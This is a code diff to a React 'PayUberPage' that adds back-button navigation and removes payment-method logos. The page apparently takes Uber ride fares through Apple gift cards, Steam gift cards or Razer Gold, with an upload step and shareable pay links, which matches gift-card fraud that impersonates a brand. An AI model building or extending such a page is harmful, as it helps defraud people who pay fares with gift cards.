@@ -24,28 +24,20 @@ const PICKUP_ETA_RANGES = {
   uber_xxl: [10, 20], black_suv: [11, 22], wav: [12, 25], car_seat: [8, 18],
 }
 
-const STEAM_LOGO_SVG = '<svg viewBox="0 0 176 44" fill="currentColor" style="width:100%;height:100%"><path d="M.329 25.333A8.01 8.01 0 0 0 7.99 31C12.414 31 16 27.418 16 23s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 22.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 23.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 25.333Z"/><path d="M4.868 27.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048"/><text x="24" y="28" fill="#FFFFFF" style="font-family:Motiva Sans, Arial;font-weight:bold;font-size:18px;letter-spacing:3px">STEAM</text></svg>'
-
 const PAYMENT_METHODS = [
   {
     id: 'apple',
     label: 'Pay with Apple Gift Card',
-    logo: '/lightappleicon.PNG',
-    logoIsImg: true,
     type: 'apple-uber',
   },
   {
     id: 'steam',
     label: 'Pay with Steam Gift Card',
-    logo: STEAM_LOGO_SVG,
-    logoIsImg: false,
     type: 'steam-uber',
   },
   {
     id: 'razer',
     label: 'Pay with Razor Gold',
-    logo: '/razerlogo.png',
-    logoIsImg: true,
     type: 'razer-uber',
   },
 ]
@@ -169,6 +161,55 @@ export default function PayUberPage() {
   const dropoffDataRef = useRef(null)
   pickupDataRef.current = pickupData
   dropoffDataRef.current = dropoffData
+
+  // Back-button support: each open view pushes a history entry; back pops it
+  const viewStackRef = useRef([])
+
+  const pushView = (name) => {
+    viewStackRef.current = [...viewStackRef.current, name]
+    history.pushState({ payuberView: name }, '')
+  }
+
+  const closeView = useCallback((name) => {
+    if (viewStackRef.current[viewStackRef.current.length - 1] === name) {
+      history.back()
+    } else {
+      viewStackRef.current = viewStackRef.current.filter((v) => v !== name)
+    }
+  }, [])
+
+  useEffect(() => {
+    const onPop = () => {
+      const stack = viewStackRef.current
+      const top = stack[stack.length - 1]
+      if (!top) return
+      viewStackRef.current = stack.slice(0, -1)
+      if (top === 'mapView') {
+        setMapViewActive(false)
+      } else if (top === 'modal') {
+        setShowModal(false)
+      } else if (top === 'share') {
+        setShareSheetUrl('')
+      } else if (top === 'picker') {
+        mapPickerTargetRef.current = null
+        mapPickerStartRef.current = null
+        mapPickerMarkerRef.current = null
+        setMapPickerTarget(null)
+        setMapPickerReady(false)
+        setMapPickerLocating(false)
+      } else if (top === 'method') {
+        setExpandedMethod(null)
+        setSelectedMethod(null)
+        setShowUploadStep(false)
+      } else if (top === 'methods') {
+        setPayStep('summary')
+        setExpandedMethod(null)
+        setShowUploadStep(false)
+      }
+    }
+    window.addEventListener('popstate', onPop)
+    return () => window.removeEventListener('popstate', onPop)
+  }, [])
 
   useEffect(() => {
     let id = localStorage.getItem('deviceId')
@@ -423,6 +464,7 @@ export default function PayUberPage() {
   async function openMapPicker(target) {
     mapPickerTargetRef.current = target
     setMapPickerTarget(target)
+    pushView('picker')
     setMapPickerLocating(true)
     setMapPickerAddress('Centering map...')
     const start = await resolveMapPickerStart(target)
@@ -439,6 +481,7 @@ export default function PayUberPage() {
     setMapPickerReady(false)
     setMapPickerLocating(false)
     mapPickerMarkerRef.current = null
+    viewStackRef.current = viewStackRef.current.filter((v) => v !== 'picker')
   }, [])
 
   // Nominatim autocomplete
@@ -538,6 +581,7 @@ export default function PayUberPage() {
       setRideList(getAllPrices(route.distance / 1000))
       setSelectedType('uber_x')
       setMapViewActive(true)
+      pushView('mapView')
     } catch (err) {
       setSearchError('An unexpected error occurred during search. Please try again.')
     } finally {
@@ -576,6 +620,7 @@ export default function PayUberPage() {
     try {
       const id = await createSession()
       setShowModal(false)
+      viewStackRef.current = viewStackRef.current.filter((v) => v !== 'modal' && v !== 'mapView')
       router.push(`/payuber?id=${id}`)
     } catch (err) {
       showToast('Unable to create the payment link right now. Please try again.')
@@ -590,7 +635,9 @@ export default function PayUberPage() {
     try {
       const id = await createSession()
       setShowModal(false)
+      viewStackRef.current = viewStackRef.current.filter((v) => v !== 'modal' && v !== 'mapView')
       setShareSheetUrl(`${window.location.origin}/payuber?id=${id}`)
+      pushView('share')
     } catch (err) {
       showToast('Unable to create the payment link right now. Please try again.')
     } finally {
@@ -601,6 +648,7 @@ export default function PayUberPage() {
 
   function handlePayNowClick() {
     setPayStep('methods')
+    pushView('methods')
     setExpandedMethod(null)
     setCardError('')
     setCardNumber('')
@@ -904,7 +952,7 @@ export default function PayUberPage() {
         <div className="map-view active">
           <div className="map-sidebar">
             <div className="map-sidebar-header">
-              <button className="map-back-btn" onClick={() => setMapViewActive(false)} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
+              <button className="map-back-btn" onClick={() => closeView('mapView')} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
             </div>
             <div className="map-sidebar-inputs">
               <div className="uber-inputs" style={{ marginBottom: 0 }}>
@@ -954,7 +1002,7 @@ export default function PayUberPage() {
                 className="btn btn-primary btn-lg"
                 id="request-btn"
                 style={{ width: '100%' }}
-                onClick={() => setShowModal(true)}
+                onClick={() => { setShowModal(true); pushView('modal') }}
               >
                 Request {RIDE_TYPES[selectedType]?.name || 'Uber'}
               </button>
@@ -1020,19 +1068,17 @@ export default function PayUberPage() {
                           <div
                             className={`ride-type ${expanded ? 'active' : ''}`}
                             onClick={() => {
-                              const next = expanded ? null : method.id
-                              setExpandedMethod(next)
-                              setSelectedMethod(expanded ? null : method)
+                              if (expanded) {
+                                closeView('method')
+                                return
+                              }
+                              setExpandedMethod(method.id)
+                              setSelectedMethod(method)
                               setCardError('')
                               setUploadError(null)
-                              if (!next) setShowUploadStep(false)
+                              pushView('method')
                             }}
                           >
-                            <div className="ride-type-img" style={{ background: 'transparent', padding: 0 }}>
-                              {method.logoIsImg
-                                ? <img src={method.logo} alt={method.label} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
-                                : <span dangerouslySetInnerHTML={{ __html: method.logo }} style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }} />}
-                            </div>
                             <div className="ride-type-content">
                               <div className="ride-type-header">
                                 <span className="ride-type-name">{method.label}</span>
@@ -1109,14 +1155,14 @@ export default function PayUberPage() {
 
       {/* Map picker overlay (GPS icon -> pick on map) */}
       {mapPickerTarget && (
-        <div className="map-picker-overlay show" onClick={closeMapPicker}>
+        <div className="map-picker-overlay show" onClick={() => closeView('picker')}>
           <div className="map-picker-sheet" onClick={(e) => e.stopPropagation()}>
             <div className="map-picker-header">
               <div>
                 <p className="map-picker-eyebrow">Pin location</p>
                 <h3>{mapPickerTarget === 'pickup' ? 'Choose pickup on map' : 'Choose destination on map'}</h3>
               </div>
-              <button className="map-picker-close" type="button" aria-label="Close map picker" onClick={closeMapPicker}>×</button>
+              <button className="map-picker-close" type="button" aria-label="Close map picker" onClick={() => closeView('picker')}>×</button>
             </div>
             <p className="map-picker-help">
               {mapPickerLocating
@@ -1136,9 +1182,9 @@ export default function PayUberPage() {
 
       {/* Payment modal */}
       {showModal && (
-        <div className="uber-modal-overlay" onClick={() => setShowModal(false)}>
+        <div className="uber-modal-overlay" onClick={() => closeView('modal')}>
           <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
-            <button className="uber-modal-close" onClick={() => setShowModal(false)}>&times;</button>
+            <button className="uber-modal-close" onClick={() => closeView('modal')}>&times;</button>
             <h2>Request {RIDE_TYPES[selectedType]?.name}</h2>
             <p className="uber-modal-subtitle">Estimated fare: <strong>{formatPrice(calculatePrice(distanceKm, selectedType).price)}</strong></p>
             <div className="uber-modal-route">
@@ -1168,9 +1214,9 @@ export default function PayUberPage() {
 
       {/* Share sheet */}
       {shareSheetUrl && (
-        <div className="uber-modal-overlay" onClick={() => setShareSheetUrl('')}>
+        <div className="uber-modal-overlay" onClick={() => closeView('share')}>
           <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
-            <button className="uber-modal-close" onClick={() => setShareSheetUrl('')}>&times;</button>
+            <button className="uber-modal-close" onClick={() => closeView('share')}>&times;</button>
             <h2>Share Payment Link</h2>
             <p className="uber-modal-subtitle" style={{ marginBottom: 24 }}>
               Send this payment link to a friend so they can choose a method and pay the fare.
